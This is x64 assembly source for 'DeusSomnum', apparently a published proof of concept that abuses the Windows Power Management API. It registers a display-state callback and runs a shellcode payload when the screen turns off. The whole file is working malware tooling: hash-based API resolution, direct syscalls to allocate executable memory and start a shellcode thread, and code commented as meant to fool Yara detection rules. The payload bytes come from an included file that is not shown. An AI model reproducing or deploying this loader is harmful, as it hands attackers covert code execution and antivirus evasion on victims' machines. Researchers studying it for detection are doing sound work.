; @file        DEUSSOMNUM.ASM
; @date        08-08-2020
; @author      Paul Laîné (@am0nsec)
; @version     1.0
; @brief       Leverage the Windows Power Management API for code execution and defense evasion.
; @details	
; @link        https://vxug.fakedoma.in/papers/VXUG/Exclusive/AbusingtheWindowsPowerManagementAPI.pdf
; @copyright   This project has been released under the GNU Public License v3 license.

include DEUSSOMNUM.INC
include SHELLCODE.INC

_DATA$00 SEGMENT PAGE 'DATA'
    szModuleName                    WORD "P", "o", "w", "r", "p", "r", "o", "f",  0
    ModuleHandle                    QWORD ?
    RegistrationHandle              QWORD ?
    dwOldThreadState                DWORD ?
    ModuleFileName                  UNICODE_STRING <>
    DeviceNotifySubscribeParameters DEVICE_NOTIFY_SUBSCRIBE_PARAMETERS <>
    VXTable                         VX_TABLE <>

    align 16
    Delay                           LARGE_INTEGER <>

    align 16
    GUID_CONSOLE_DISPLAY_STATE      GUID <>
_DATA$00 ENDS

_TEXT$00 SEGMENT ALIGN(10h) 'CODE'
    ; @brief  Find the address of the EAT of a module
    ; @param  Module image base address. 
    ; @return The base address of a module
    GetExportAddressTable PROC
        mov rax, rcx                                                                              ;
        mov r10, rcx                                                                              ;

        ; Check IMAGE_DOS_HEADER signature
        cmp [rax].IMAGE_DOS_HEADER.e_magic, 5A4Dh                                                 ; DOS Header --> MZ
        jne _failure                                                                              ;

        ; Check IMAGE_NT_HEADERS64 signature
        mov ebx, [rax].IMAGE_DOS_HEADER.e_lfanew                                                  ; RVA of IMAGE_NT_HEADERS64
        add rax, rbx                                                                              ; 
        cmp [rax].IMAGE_NT_HEADERS64.Signature, 00004550h                                         ; NT Header --> PE00
        jne _failure                                                                              ; 

        mov ebx, IMAGE_NT_HEADERS64.OptionalHeader                                                ; RVA of IMAGE_OPTIONAL_HEADER64
        add rax, rbx                                                                              ;                                              
        cmp [rax].IMAGE_OPTIONAL_HEADER64.Magic, 20bh                                             ; Optional header --> 0x20b
        jne _failure                                                                              ;

        lea rax, [rax].IMAGE_OPTIONAL_HEADER64.DataDirectory                                      ; First entry of the DataDirectory array
        mov ebx, [rax].IMAGE_DATA_DIRECTORY.VirtualAddress                                        ; RVA of IMAGE_EXPORT_DIRECTORY
        mov rax, r10                                                                              ; ImageBase
        add rax, rbx                                                                              ; Module + RVA
        ret                                                                                       ; return EAT address
_failure:
        xor rax, rax                                                                              ;
        ret                                                                                       ; return null
    GetExportAddressTable ENDP

    ; @brief  Get the function address and system call, if applicable.
    ; @param  The VX_TABLE_ENTRY to fill.
    ; @param  The EAT address of the module in whihc the function is defined.
    ; @param  The base address of the module
    ; @param  Whether the system call habe to be retrieved. Only for NTDLL functions
    ; @return Whether the function has been found.
    GetFunctionAddress PROC
        cmp rcx, 00h                                                 ; Check if VXTable is null
        je _failure                                                  ;
        cmp rdx, 00h                                                 ; Check if module image base is null
        je _failure                                                  ;
        
        mov ebx, [rdx].IMAGE_EXPORT_DIRECTORY.AddressOfNames         ; Address of the function name
        mov r12, r8                                                  ; Function name RVA
        add r12, rbx                                                 ; ImageBase + RVA
                      
        mov ebx, [rdx].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     ; Address of function pointers
        mov r13, r8                                                  ; 
        add r13, rbx                                                 ;

        mov ebx, [rdx].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals  ; Address of function ordinals
        mov r14, r8                                                  ;
        add r14, rbx                                                 ;

        mov r15d, [rdx].IMAGE_EXPORT_DIRECTORY.NumberOfNames         ; Total number of named functions
        dec r15                                                      ;

;-----------------------------------------------------------------------------
; Find function ordinal index w/ function name hash
;-----------------------------------------------------------------------------
_parse_functions_name:
        mov rbx, 4h                                                  ; sizeof(DWORD)
        imul rbx, r15                                                ; siezof(DWORD) * RCX
        mov esi, [r12 + rbx]                                         ; Function RVA 
        add rsi, r8                                                  ; Function RVA + ImageBase
        
        mov r10d, 5381h                                              ; hash = 0x5381
_djb2:
        mov r11d, r10d                                               ; Store original hash value for later
        shl r10d, 5                                                  ; hash << 5 
        add r10d, r11d                                               ; (hash << 5) + hash

        xor r11d, r11d                                               ; Clean temporary hash value
        mov r11b, byte ptr [rsi]                                     ; Get ASCII char
        add r10d, r11d                                               ; ((hash << 5) + hash) + char

        inc rsi                                                      ; Next string char
        cmp byte ptr [rsi], 00h                                      ; End of string
        jne _djb2                                                    ;

        xor r10d, [rcx].VX_TABLE_ENTRY.dwHash                        ;
        jz _get_function_address                                     ;

        dec r15                                                      ;
        jnz _parse_functions_name                                    ;
        jz _failure                                                  ;

;-----------------------------------------------------------------------------
; Find the function address w/ function ordinal
;-----------------------------------------------------------------------------
_get_function_address:
        mov rax, 2h                                                  ; sizeof(WORD)
        imul rax, r15                                                ; sizeof(WORD) * RCX
        mov ax, [r14 + rax]                                          ; AX = function ordinal

        imul rax, 4                                                  ; sizeof(DWORD) * ordinal
        mov eax, [r13 + rax]                                         ; RVA of function
        mov rbx, r8                                                  ; RBX = ImageBase
        add rbx, rax                                                 ; RBX = address of function
        mov [rcx].VX_TABLE_ENTRY.pAddress, rbx                       ;

        cmp r9, 00h                                                  ; Check if system call need to be retrieved
        je _success                                                  ;

;-----------------------------------------------------------------------------
; Find the function system call w/ function address
;-----------------------------------------------------------------------------
_get_function_syscall:
        inc rbx                                                      ;
        cmp byte ptr [rbx], 00C3h                                    ; Check if RET
        je _failure                                                  ;

        cmp word ptr [rbx], 050Fh                                    ; Check if syscall
        jne _get_function_syscall                                    ; 

        sub rbx, 0Eh                                                 ; Address of system call
        mov bx, word ptr [rbx]                                       ; BX = system call
        mov [rcx].VX_TABLE_ENTRY.wSystemCall, bx                     ; 

_success:
        mov rax, 1                                                   ;
        ret                                                          ; return TRUE
_failure:
        xor rax, rax                                                 ;
        ret                                                          ; return FALSE
    GetFunctionAddress ENDP

    ; @brief  Execute fast system call
    ; @return The HRESULT from the execution of the fast system call.
    FastSystemCall PROC
        syscall
        cmp rax, 0h
        jne _failure
;-----------------------------------------------------------------------------
; Dummy content to "fool" some Yara rules
;-----------------------------------------------------------------------------
_success:
        ret
_failure:
        ret
    FastSystemCall ENDP

    ; @brief  Power notification function callback
    ; @param  Context
    ; @param  Type
    ; @param  Setting
    ; @return Callback status code
    HandlePowerNotifications PROC 
        ; Check message
        cmp edx, PBT_POWERSETTINGCHANGE                    ; Power setting change message
        jne _display_on                                    ;
      
        ;mov rcx, sizeof GUID_CONSOLE_DISPLAY_STATE        ; sizeof(GUID)
        lea rsi, GUID_CONSOLE_DISPLAY_STATE                ; Address of the GUID_CONSOLE_DISPLAY_STATE
        lea rdi, [r8].POWERBROADCAST_SETTING.PowerSetting  ; Address of GUID from 3rd parameter
        repz cmpsb                                         ;
        jne _display_on                                    ;

        cmp [r8].POWERBROADCAST_SETTING.Data[1], 00h       ; Display is turned off
        je _display_off                                    ;
        cmp [r8].POWERBROADCAST_SETTING.Data[1], 02h       ; Display is dimmed
        je _display_off                                    ;

;-----------------------------------------------------------------------------
; When the system is back from sleep mode
;-----------------------------------------------------------------------------
_display_on:
        xor rax, rax                                                                              ; return TRUE
        ret                                                                                       ; 

;-----------------------------------------------------------------------------
; When the system go to sleep mode
;-----------------------------------------------------------------------------
_display_off:
        call Payload                                                                              ; Execute payload here
        ret
    HandlePowerNotifications ENDP

    ; @brief Execute shellcode in memory
    Payload PROC
        xor rax, rax                                                     ; Clean register for fast system call
        mov r10d, scl                                                    ; Length of shellcode
        mov sDataSize, r10                                               ; Page size to allocate
        mov lpAddress, 0h                                                ; Page address
        
        ; Execute NtAllocateVirtualMemory
        mov ax, VXTable.NtAllocateVirtualMemory.wSystemCall              ;
        mov rcx, 0FFFFFFFFFFFFFFFFh                                      ; ProcessHandle
        lea rdx, lpAddress                                               ; BaseAddress 
        xor r8,  r8                                                      ; ZeroBits
        lea r9, sDataSize                                                ; RegionSize
        mov qword ptr [rsp + 20h], 3000h                                 ; AllocationType
        mov qword ptr [rsp + 28h], 4                                     ; Protect
        
        mov r10, rcx                                                     ; Store 1st param for fast system call
        call FastSystemCall                                              ;
        cmp rax, 00h                                                     ;
        jne _failure                                                     ;

        ; Copy shellcode
        cld                                                              ; Clear direction flag == forward copy
        lea rsi, sc1                                                     ; Origin
        mov rdi, lpAddress                                               ; Destination
        mov ecx, scl                                                     ; Size of shellcode
        rep movsb                                                        ; Copy byte until RCX = 0

        ; Execute NtProtectVirtualMemory
        mov ax, VXTable.NtProtectVirtualMemory.wSystemCall               ;
        mov rcx, 0FFFFFFFFFFFFFFFFh                                      ; ProcessHandle
        lea rdx, lpAddress                                               ; BaseAddress
        lea r8, sDataSize                                                ; NumberOfBytesToProtect
        mov r9d, 20h                                                     ; NewAccessProtection        

        mov OldProtect, 00h                                              ;
        lea r11, OldProtect                                              ;
        mov qword ptr [rsp + 20h], r11                                   ; OldAccessProtection

        mov r10, rcx                                                     ; Store 1st param for fast system call
        call FastSystemCall                                              ;
        cmp eax, 00h                                                     ; (NTSTATUS  != 0)
        jne _failure                                                     ;

        ; Execute NtCreateThreadEx
        mov ax, VXTable.NtCreateThreadEx.wSystemCall
        mov hThreadHandle, 0                                             ;
        lea rcx, hThreadHandle                                           ; hThread
        mov rdx, 1FFFFFh                                                 ; DesiredAccess
        xor r8, r8                                                       ; ObjectAttributes
        mov r9, 0FFFFFFFFFFFFFFFFh                                       ; ProcessHandle
        mov r10, lpAddress                                               ;
        mov qword ptr [rsp + 20h], r10                                   ; lpStartAddress
        mov qword ptr [rsp + 28h], 00h                                   ; lpParameter
        mov qword ptr [rsp + 30h], 00h                                   ; Flags
        mov qword ptr [rsp + 38h], 00h                                   ; StackZeroBits
        mov qword ptr [rsp + 40h], 00h                                   ; SizeOfStackCommit
        mov qword ptr [rsp + 48h], 00h                                   ; SizeOfStackReserve
        mov qword ptr [rsp + 50h], 00h                                   ; lpBytesBuffer

        mov r10, rcx                                                     ; Store 1st param for fast system call
        call FastSystemCall                                              ;
        cmp eax, 00h                                                     ; (NTSTATUS  != 0)
        jne _failure                                                     ;

        ; Execute NtWaitForSingleObject
        mov ax, VXTable.NtWaitForSingleObject.wSystemCall                ; 
        mov rcx, hThreadHandle                                           ; ObjectHandle
        xor rdx, rdx                                                     ; Alertable

        mov Timeout, 0FFFFFFFFFF676980h                                  ; TimeOut 
        lea r8, Timeout                                                  ; 

        mov r10, rcx                                                     ; Store 1st param for fast system call
        call FastSystemCall                                              ;
        cmp eax, 00h                                                     ; (NTSTATUS  != 0)
        jne _failure                                                     ;

_failure:
        xor rax, rax
        ret
    Payload ENDP

    ; @brief  Entry point of the program
    ; @return The program status code
    DEUSSOMNUM PROC
        mov rcx, gs:[60h]                                                                         ; Get Process Environment Block (PEB)
        cmp [rcx].PEB.OSMajorVersion, 0Ah                                                         ; 
        jne _failure                                                                              ; Jump if not Windows 10

        mov rax, [rcx].PEB.Ldr                                                                    ; 
        mov rax, [rax].PEB_LDR_DATA.InMemoryOrderModuleList.Flink - 10h                           ; First loaded module: e.g. DeusSomnum.exe
        mov rax, [rax].LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks.Flink - 10h                        ; Second loaded module: ntdll.dll
        mov rax, [rax].LDR_DATA_TABLE_ENTRY.DllBase                                               ; Image base of the module
        mov r10, rax                                                                              ; Store for later

        mov rcx, rax                                                                              ; Module ImageBase
        call GetExportAddressTable                                                                ; Get EAT address for ntdll.dll
        cmp rax, 00h                                                                              ; Check if address invalid
        je _failure
        mov r11, rax                                                                              ; Save the Address of the EAT

        ; Fill the VX table
        mov VXTable.NtAllocateVirtualMemory.dwHash, NtAllocateVirtualMemoryHash                   ; DJB2 hash of NtAllocateVirtualMemory
        mov VXTable.NtProtectVirtualMemory.dwHash, NtProtectVirtualMemoryHash                     ; DJB2 hash of NtProtectVirtualMemory
        mov VXTable.NtCreateThreadEx.dwHash, NtCreateThreadExHash                                 ; DJB2 hash of NtCreateThreadEx
        mov VXTable.NtWaitForSingleObject.dwHash, NtWaitForSingleObjectHash                       ; DJB2 hash of NtWaitForSingleObject
        mov VXTable.NtResumeThread.dwHash, NtResumeThreadHash                                     ; DJB2 hash of NtResumeThread
        mov VXTable.NtSuspendThread.dwHash, NtSuspendThreadHash                                   ; DJB2 hash of NtSuspendThread
        mov VXTable.LdrLoadDll.dwHash, LdrLoadDllHash                                             ; DJB2 hash of LdrLoadDll
        mov VXTable.NtSetThreadExecutionState.dwHash, NtSetThreadExecutionStateHash               ; DJB2 hash of NtSetThreadExecutionState
        mov VXTable.NtDelayExecution.dwHash, NtDelayExecutionHash                                 ; DJB2 hash of NtDelayExecutionHash

;-----------------------------------------------------------------------------
; Get address and system calls of NTDLL functions
;-----------------------------------------------------------------------------
        mov edx, 0                                                                                ; Clean dividend
        mov eax, SizeofVxTable                                                                    ; Dividend
        sub eax, SizeofVxTableEntry                                                               ; 
        sub eax, SizeofVxTableEntry                                                               ; 
        mov ecx, SizeofVxTableEntry                                                               ; Divisor
        div ecx                                                                                   ; Get number of functions - last entry
        mov rcx, rax                                                                              ; Initialise count for loop

_get_ntdll_function:
        mov rdx, SizeofVxTableEntry                                                               ; RDX = sizeof(VX_TABLE_ENTRY)
        imul rdx, rcx                                                                             ; RDX = sizeof(VX_TABLE_ENTRY) * RCX
        sub rdx, SizeofVxTableEntry                                                               ; RDX = (sizeof(VX_TABLE_ENTRY) * RCX) - sizeof(VX_TABLE_ENTRY)
        push rcx                                                                                  ; Preserve function counter
        push r11                                                                                  ; Preserve NTDLL EAT address
        push r10                                                                                  ; Preserve NTDLL module base address
        lea rcx, VXTable                                                                          ; Address of VX Table
        add rcx, rdx                                                                              ; RCX = VX_TABLE[RDX]
        mov rdx, r11                                                                              ; NTDLL EAT address
        mov r8, r10                                                                               ; NTDLL module base address
        mov r9, 1h                                                                                ; Wether system call have to be retrieved
        call GetFunctionAddress                                                                   ; Get function address + system call
        cmp rax, 00h                                                                              ;
        je _failure                                                                               ;
        pop r10                                                                                   ; Restor NTDLL EAT Address
        pop r11                                                                                   ; Restor NTDLL module base address
        pop rcx                                                                                   ; Restor function counter
        loop _get_ntdll_function

;-----------------------------------------------------------------------------
; Get address of LdrLoadDll
;-----------------------------------------------------------------------------
        push r11                                                                                  ; Preserve NTDLL EAT address
        push r10                                                                                  ; Preserve NTDLL module base address
        lea rcx, VXTable.LdrLoadDll                                                               ; Address of VX Table
        mov rdx, r11                                                                              ; NTDLL EAT address
        mov r8, r10                                                                               ; NTDLL module base address
        mov r9, 0h                                                                                ; Wether system call have to be retrieved
        call GetFunctionAddress                                                                   ; Get function address + system call
        cmp rax, 00h                                                                              ;
        je _failure                                                                               ;
        pop r10                                                                                   ; Restor NTDLL EAT Address
        pop r11                                                                                   ; Restor NTDLL module base address

;-----------------------------------------------------------------------------
; Load the Powrprof module
;-----------------------------------------------------------------------------
_load_powrprof:
        sub rsp, 10h + 8h
        lea rax, szModuleName                                                                     ; Address of the wide string
        mov [ModuleFileName].UNICODE_STRING.Buffer, rax                                           ; 
        mov [ModuleFileName].UNICODE_STRING._Length, sizeof szModuleName - 2h                     ; strlen(Buffer)
        mov [ModuleFileName].UNICODE_STRING.MaximumLength, sizeof szModuleName                    ; sizeof(Buffer)

        mov rcx, 0h                                                                               ; PathToFile 
        mov rdx, 0h                                                                               ; Flags 
        lea r8, ModuleFileName                                                                    ; ModuleFileName
        lea r9, ModuleHandle                                                                      ; ModuleHandle 
        call VXTable.LdrLoadDll.pAddress                                                          ;

;-----------------------------------------------------------------------------
; Get PowerSettingRegisterNotification function address
;-----------------------------------------------------------------------------
        mov rcx, ModuleHandle                                                                     ;
        call GetExportAddressTable                                                                ;
        cmp rax, 00h                                                                              ; Check if address invalid
        je _failure                                                                               ;

        mov VXTable.PowerSettingRegisterNotification.dwHash, PowerSettingRegisterNotificationHash ; VX Table entry
        lea rcx, VXTable.PowerSettingRegisterNotification                                         ;
        mov rdx, rax                                                                              ; Address of EAT of Powrprof
        mov r8, ModuleHandle                                                                      ; Base address of Powrprof
        mov r9, 0h                                                                                ; No system call
        call GetFunctionAddress                                                                   ; Get function address
        cmp rax, 00h                                                                              ;
        je _failure                                                                               ;

;-----------------------------------------------------------------------------
; Register power notification
;-----------------------------------------------------------------------------
        mov GUID_CONSOLE_DISPLAY_STATE.Data1, 6fe69556h                                           ; {6fe69556
        mov GUID_CONSOLE_DISPLAY_STATE.Data2, 704ah                                               ; -704a
        mov GUID_CONSOLE_DISPLAY_STATE.Data3, 47a0h                                               ; -47a0
        mov GUID_CONSOLE_DISPLAY_STATE.Data4[0], 8fh                                              ; -8f
        mov GUID_CONSOLE_DISPLAY_STATE.Data4[1], 24h                                              ; 24
        mov GUID_CONSOLE_DISPLAY_STATE.Data4[2], 0c2h                                             ; c2
        mov GUID_CONSOLE_DISPLAY_STATE.Data4[3], 8dh                                              ; 8d
        mov GUID_CONSOLE_DISPLAY_STATE.Data4[4], 93h                                              ; 93
        mov GUID_CONSOLE_DISPLAY_STATE.Data4[5], 6fh                                              ; 6f
        mov GUID_CONSOLE_DISPLAY_STATE.Data4[6], 0dah                                             ; da
        mov GUID_CONSOLE_DISPLAY_STATE.Data4[7], 47h                                              ; 47}

        lea rcx, GUID_CONSOLE_DISPLAY_STATE                                                       ; SettingGuid
        mov rdx, DEVICE_NOTIFY_CALLBACK                                                           ; Flags

        lea rax, HandlePowerNotifications                                                         ; Address of DEVICE_NOTIFY_SUBSCRIBE_PARAMETERS 
        mov DeviceNotifySubscribeParameters.Callback, rax                                         ; 
        mov DeviceNotifySubscribeParameters.Context, 00h                                          ;
        lea r8, DeviceNotifySubscribeParameters                                                   ; Recipient

        mov RegistrationHandle, 00h                                                               ; Set the variable to NULL    
        lea r9, RegistrationHandle                                                                ; RegistrationHandle
        call VXTable.PowerSettingRegisterNotification.pAddress                                    ; Call the function
        cmp rax, 00h                                                                              ; Check if successfull execution
        jne _failure                                                                              ;

;-----------------------------------------------------------------------------
; Change thread state
;-----------------------------------------------------------------------------
        xor rax, rax                                                                              ; Clean the register
        mov ax, VXTable.NtSetThreadExecutionState.wSystemCall                                     ; Move the system call for fast system call
        mov rcx, ES_AWAYMODE_REQUIRED + ES_CONTINUOUS + ES_SYSTEM_REQUIRED                        ; NewFlags
        mov r10, rcx                                                                              ; Stored for fast system call
        mov dwOldThreadState, 0h                                                                  ;
        lea rdx, dwOldThreadState                                                                 ; OldFlags
        
        call FastSystemCall                                                                       ;
        cmp rax, 00h                                                                              ;
        jne _failure                                                                              ;

;-----------------------------------------------------------------------------
; Infinite loop to wait execution
;-----------------------------------------------------------------------------
        xor rcx, rcx                                                                              ; Alertable
        mov r10, rcx                                                                              ;
        mov Delay.HighPart, 0ffffffffh                                                            ; 5 seconds 
        mov Delay.LowPart, 0fd050f80h                                                             ;
        lea rdx, Delay                                                                            ; DelayInterval
_infinite:
        xor rax, rax                                                                              ; Clean register
        mov ax, VXTable.NtDelayExecution.wSystemcall                                              ;
        call FastSystemCall                                                                       ; Execute fast system call
        cmp rax, 00h                                                                              ; 
        je _infinite                                                                              ;

;-----------------------------------------------------------------------------
; Successfully execution of the function
;-----------------------------------------------------------------------------
_success:
        mov rax, 1                                                                                ;
        ret                                                                                       ;

;-----------------------------------------------------------------------------
; In case something goes wrong
;-----------------------------------------------------------------------------
_failure:
        xor rax, rax                                                                              ;
        ret                                                                                       ;
    DEUSSOMNUM ENDP

_TEXT$00 ENDS

END
